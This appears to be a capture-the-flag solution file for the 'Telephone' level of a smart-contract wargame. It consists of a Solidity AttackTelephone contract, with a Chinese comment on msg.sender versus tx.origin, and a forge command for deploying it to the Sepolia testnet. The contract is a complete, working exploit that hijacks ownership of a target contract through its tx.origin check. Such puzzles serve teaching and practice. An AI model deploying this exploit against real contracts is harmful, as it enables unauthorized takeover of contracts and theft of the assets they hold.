# 05-Telephone
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone { 
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    constructor(address _telephoneAddress) {
        // 对于 Telephone 合约，msg.sender 是 AttackTelephone tx.origin 是0xyour_address
        ITelephone(_telephoneAddress).changeOwner(msg.sender);
    }
}

/**
forge create src/05-Telephone/AttackTelephone.sol:AttackTelephone \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --constructor-args $Telephone_ADDRESS
 */
```